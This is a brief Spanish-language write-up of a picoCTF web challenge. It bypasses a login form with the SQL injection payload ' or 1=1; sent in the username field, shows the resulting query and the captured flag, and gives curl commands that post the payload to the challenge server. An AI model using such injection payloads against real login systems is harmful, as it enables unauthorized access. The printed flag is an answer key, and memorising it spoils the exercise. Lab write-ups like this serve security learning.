## Descripcion 

Hay un sitio web en https://jupiter.challenges.picoctf.org/problem/39720/ (enlace) o http://jupiter.challenges.picoctf.org:39720. ¿Crees que puedes iniciar sesión con nosotros? ¡Intenta ver si puedes iniciar sesión!
## Solucion


inspeccionamos
cambiamos el login el value por 1 
inyeccion sql
username: ' or 1=1; ponemos esto en el username 
password: 
SQL query: SELECT * FROM users WHERE name='' or 1=1; AND password=''


Logged in!
Your flag is: picoCTF{s0m3_SQL_c218b685}

////////////Consola

curl (link) -d "username:admin&password=admin&debug=1"

curl (link) -d "username:' or 1=1;&password=admin&debug=1"


## Notas adicionales
